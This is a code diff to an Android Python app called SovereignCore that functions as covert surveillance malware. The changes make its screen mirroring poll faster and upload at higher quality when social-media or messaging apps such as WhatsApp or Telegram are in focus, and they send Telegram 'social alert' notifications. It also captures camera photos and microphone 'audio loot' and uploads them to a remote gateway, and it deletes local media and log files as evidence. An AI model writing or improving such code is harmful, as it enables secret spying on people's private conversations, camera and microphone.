@@ -67,6 +67,20 @@ def is_safe_command(cmd_str):
             return False
     return True
 
+def is_social_media(pkg_name):
+    """Detect if the current package belongs to a social media app."""
+    if not pkg_name: return False
+    social_pkgs = [
+        "com.facebook.katana", "com.instagram.android", "com.twitter.android", 
+        "com.ss.android.ugc.trill", "com.zhiliaoapp.musically", # TikTok
+        "com.whatsapp", "org.telegram.messenger", "com.discord"
+    ]
+    pkg_lower = str(pkg_name).lower()
+    for sp in social_pkgs:
+        if sp in pkg_lower:
+            return True
+    return False
+
 
 class SovereignCore(App):
     is_stealth = False
@@ -194,19 +208,42 @@ class SovereignCore(App):
             noir_log(f"[SMC] Connectivity Error (DNS?): {e}", level="CRITICAL")
 
     def _screen_share_loop(self):
-        """High-Performance Screen Mirroring with Intelligent Privacy Shield (v14.0.4)."""
+        """High-Performance Adaptive Mirroring with Pixel-Hash Delta Check (v14.0.7)."""
+        import hashlib
+        last_img_hash = ""
         while True:
             try:
-                # Fast Privacy Check: Use dumpsys instead of slow uiautomator dump
+                # Fast Privacy & Activity Check
                 res = self._run_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
                 focus = res.get("output", "").lower()
                 
                 is_safe = is_safe_command(focus)
+                is_social = is_social_media(focus)
                 
                 if is_safe:
-                    # Trigger high-speed capture
-                    self._execute({"action": "screenshot", "command_id": "auto_mirror"})
-                    time.sleep(3) # Peak speed: 3s intervals
+                    # Accelerate polling if social media is active
+                    interval = 2 if is_social else 5
+                    
+                    # Take screenshot
+                    parent = App.get_running_app().user_data_dir
+                    path = os.path.join(parent, "mirror_temp.png")
+                    self._run_shell(f"screencap -p {path}")
+                    
+                    if os.path.exists(path):
+                        # Simple Hash Check to detect changes
+                        with open(path, "rb") as f:
+                            current_hash = hashlib.md5(f.read()).hexdigest()
+                        
+                        if current_hash != last_img_hash:
+                            last_img_hash = current_hash
+                            # Trigger upload with adaptive quality
+                            quality = 60 if is_social else 35
+                            self._execute({"action": "screenshot", "command_id": "auto_mirror", "is_social": is_social, "quality": quality, "local_path": path})
+                        else:
+                            # No change, slow down
+                            interval = 10
+                    
+                    time.sleep(interval)
                 else:
                     noir_log("[🛡️ PRIVACY] Mirroring paused: Active content restricted.", level="WARNING")
                     time.sleep(30)
@@ -325,45 +362,62 @@ class SovereignCore(App):
                 parent = App.get_running_app().user_data_dir
                 if not os.path.exists(parent):
                     os.makedirs(parent, exist_ok=True)
-                path = os.path.join(parent, "noir_vision.png")
-                # Take screenshot via Shizuku-enabled shell
-                res = self._run_shell(f"screencap -p {path}")
-                if not res["success"]:
-                    result = {"success": False, "error": f"Screencap Error: {res.get('output', 'Unknown error')}"}
-                    return # Exit this block
                 
-                time.sleep(0.5) 
-
-                # COMPRESSION ENGINE: Convert PNG to optimized JPEG
+                path = params.get("local_path")
+                is_mirror = "local_path" in params
+                
+                if not path or not os.path.exists(path):
+                    path = os.path.join(parent, f"temp_{int(time.time())}.png")
+                    self._run_shell(f"screencap -p {path}")
+                
                 jpeg_path = path.replace(".png", ".jpg")
                 try:
                     from PIL import Image
+                    quality = params.get("quality", 50)
                     with Image.open(path) as img:
-                        if img.mode != 'RGB':
-                            img = img.convert('RGB')
-                        
-                        # Optimization: Rescale to max 1280px while maintaining aspect ratio
-                        img.thumbnail((1280, 1280))
-                        
-                        # High-Efficiency Compression: JPEG 50
-                        img.save(jpeg_path, "JPEG", quality=50, optimize=True)
+                        if img.mode != 'RGB': img = img.convert('RGB')
+                        img.thumbnail((1080, 1080))
+                        img.save(jpeg_path, "JPEG", quality=quality, optimize=True)
                     upload_file = jpeg_path
-                except Exception as e:
-                    self._log(f"[SMC] Compression failed: {e}")
-                    upload_file = path # Fallback to original
+                except:
+                    upload_file = path 
 
-                with open(upload_file, 'rb') as f:
-                    r = session.post(
-                        f"{GATEWAY_URL}/agent/upload",
-                        headers={"Authorization": f"Bearer {API_KEY}"},
-                        files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
-                        data={'device_id': DEVICE_ID},
-                        timeout=40
-                    )
+                try:
+                    if os.path.exists(upload_file):
+                        with open(upload_file, 'rb') as f:
+                            r = session.post(
+                                f"{GATEWAY_URL}/agent/upload",
+                                headers={"Authorization": f"Bearer {API_KEY}"},
+                                files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
+                                data={'device_id': DEVICE_ID},
+                                timeout=40
+                            )
+                        if r.status_code == 200:
+                            key = r.json().get('key', '')
+                            result = {"success": True, "output": f"Screenshot uploaded: {key}"}
+                except Exception as e:
+                    result = {"success": False, "error": f"Upload failed: {e}"}
+                finally:
+                    # ABSOLUTE EPHEMERAL PROTOCOL: Always delete local copies
+                    for p in [path, jpeg_path]:
+                        if p and os.path.exists(p):
+                            try: os.remove(p)
+                            except: pass
 
                 if r.status_code == 200:
                     key = r.json().get('key', '')
                     result = {"success": True, "output": f"Screenshot uploaded: {key}"}
+                    # If it was a priority social media capture, inform the gateway to alert Telegram
+                    if action.get("is_social"):
+                        session.post(
+                            f"{GATEWAY_URL}/agent/command",
+                            headers={"Authorization": f"Bearer {API_KEY}"},
+                            json={
+                                "action": {"type": "social_alert", "image_key": key},
+                                "description": "Priority Social Media Interaction Alert"
+                            },
+                            timeout=5
+                        )
                 else:
                     result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                 
@@ -403,33 +457,39 @@ class SovereignCore(App):
             elif atype in ("camera_back", "camera_front"):
                 is_front = "front" in atype
                 cam_id = 1 if is_front else 0
-                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}.jpg")
-                # Try termux-camera-photo if available, else generic intent
-                os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
-                time.sleep(2.0)
-                if os.path.exists(path):
-                    with open(path, 'rb') as f:
-                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
-                    result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
-                    # EPHEMERAL CLEANUP
-                    try: os.remove(path)
-                    except: pass
-                else:
-                    result = {"success": False, "error": "Camera capture failed."}
+                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}_{int(time.time())}.jpg")
+                try:
+                    os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
+                    time.sleep(3.0) # Wait for hardware
+                    if os.path.exists(path):
+                        with open(path, 'rb') as f:
+                            r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
+                        result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
+                    else:
+                        result = {"success": False, "error": "Camera capture failed."}
+                finally:
+                    if os.path.exists(path):
+                        try: os.remove(path)
+                        except: pass
 
             elif atype == "audio_record":
-                path = os.path.join(App.get_running_app().user_data_dir, "audio_loot.mp3")
-                os.system(f"termux-audio-record -d 10 {path}")
-                time.sleep(11.0)
-                if os.path.exists(path):
-                    with open(path, 'rb') as f:
-                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
-                    result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
-                    # EPHEMERAL CLEANUP
-                    try: os.remove(path)
-                    except: pass
-                else:
-                    result = {"success": False, "error": "Audio recording failed."}
+                duration = params.get("duration", 10)
+                path = os.path.join(App.get_running_app().user_data_dir, f"audio_{int(time.time())}.mp3")
+                try:
+                    self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
+                    os.system(f"termux-audio-record -d {duration} {path}")
+                    time.sleep(duration + 1.0)
+                    if os.path.exists(path):
+                        with open(path, 'rb') as f:
+                            r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
+                        result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
+                    else:
+                        self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
+                        result = {"success": False, "error": "Termux Audio failed."}
+                finally:
+                    if os.path.exists(path):
+                        try: os.remove(path)
+                        except: pass
 
             elif atype == "gallery_sync":
                 # List latest 5 files in Camera folder
@@ -437,17 +497,18 @@ class SovereignCore(App):
                 result = {"success": True, "output": f"Gallery contents:\n{files}"}
 
             elif atype == "heal":
-                # SYSTEM HEAL: Clear old caches and logs
-                self._log("[SMC] 🚑 NEURAL HEAL INITIATED: Purging stale caches...")
+                # SYSTEM HEAL: Deep Purge of all temporary files
+                self._log("[SMC] 🚑 NEURAL HEAL: Executing Deep Purge Protocol...")
                 parent = App.get_running_app().user_data_dir
                 cleared = 0
-                for f in os.listdir(parent):
-                    if f.endswith(".png") or f.endswith(".jpg") or f.endswith(".log"):
-                        try:
-                            os.remove(os.path.join(parent, f))
-                            cleared += 1
-                        except: pass
-                result = {"success": True, "output": f"System Healed. {cleared} stale files purged."}
+                for root, dirs, files in os.walk(parent):
+                    for f in files:
+                        if f.endswith((".png", ".jpg", ".mp3", ".xml", ".log", ".tmp")):
+                            try:
+                                os.remove(os.path.join(root, f))
+                                cleared += 1
+                            except: pass
+                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged from device."}
 
             elif atype == "update":
                 # Autonomous update logic: Trigger a rebuild and restart
